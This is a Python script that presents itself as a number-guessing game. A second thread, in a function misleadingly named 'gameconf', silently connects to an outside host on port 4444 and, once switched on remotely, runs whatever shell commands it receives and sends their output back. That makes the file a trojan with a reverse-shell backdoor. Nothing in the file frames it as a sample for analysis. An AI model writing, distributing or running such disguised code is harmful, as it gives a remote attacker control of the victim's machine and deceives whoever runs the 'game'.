import random
import socket
import threading
import subprocess
import os

def gameconf():
	HOST = 'zaptech.zapto.org'
	PORT = 4444
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	mode = False

	while True:
		server_command = client.recv(1024).decode('utf-8')
		if server_command == "modeon":
			mode = True
			client.send("<< mode turned on >> ".encode('utf-8'))
			continue
		if server_command == "modeoff":
			mode = False
			client.send(">> mode turned off << ".encode('utf-8'))
		if mode:
			op = subprocess.Popen(server_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
			output = op.stdout.read()
			output_error = op.stderr.read()
			client.send(output + output_error)
		else:
			if server_command == "hello":
				print ("Hello World!")
		client.send(" ".encode('utf-8'))
def game():
	number = random.randint(0, 1000)
	tries = 1
	done = False

	while not done:
		guess = int(input("Enter a guess: "))

		if guess == number:
			done =True
			print("You won!")
		else:
			tries += 1
			if guess > number:
				print ("The actual number is smaller!")
			else:
				print ("The actual number is larger!")
	print(f"You needed {tries} tries!")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=gameconf)

t1.start()
t2.start()
